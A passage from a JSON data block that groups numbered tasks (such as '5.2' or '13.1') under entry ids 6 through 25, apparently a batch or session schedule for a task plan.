    { "id": 6, "tasks": ["5.2", "5.3", "6.1"] },
    { "id": 7, "tasks": ["6.2", "6.3", "6.4", "7.1"] },
    { "id": 8, "tasks": ["7.2", "7.3", "8.1"] },
    { "id": 9, "tasks": ["8.2", "9.1"] },
    { "id": 10, "tasks": ["9.2", "10.1"] },
    { "id": 11, "tasks": ["10.2", "10.3", "11.1"] },
    { "id": 12, "tasks": ["11.2", "11.3"] },
    { "id": 13, "tasks": ["13.1", "13.2", "13.3"] },
    { "id": 14, "tasks": ["13.4", "14.1", "14.2", "14.3"] },
    { "id": 15, "tasks": ["14.4", "15.1", "15.2"] },
    { "id": 16, "tasks": ["15.3", "16.1"] },
    { "id": 17, "tasks": ["16.2", "16.3", "17.1"] },
    { "id": 18, "tasks": ["17.2", "18.1"] },
    { "id": 19, "tasks": ["18.2", "20.1", "20.2"] },
    { "id": 20, "tasks": ["20.3", "21.1", "21.2"] },
    { "id": 21, "tasks": ["21.3", "22.1", "22.2"] },
    { "id": 22, "tasks": ["22.3", "23.1", "23.2"] },
    { "id": 23, "tasks": ["25.1", "25.2", "25.3", "25.4"] },
    { "id": 24, "tasks": ["26.1", "26.2", "26.3"] },
    { "id": 25, "tasks": ["27.1", "27.2", "27.3"] }
  ]
}
```
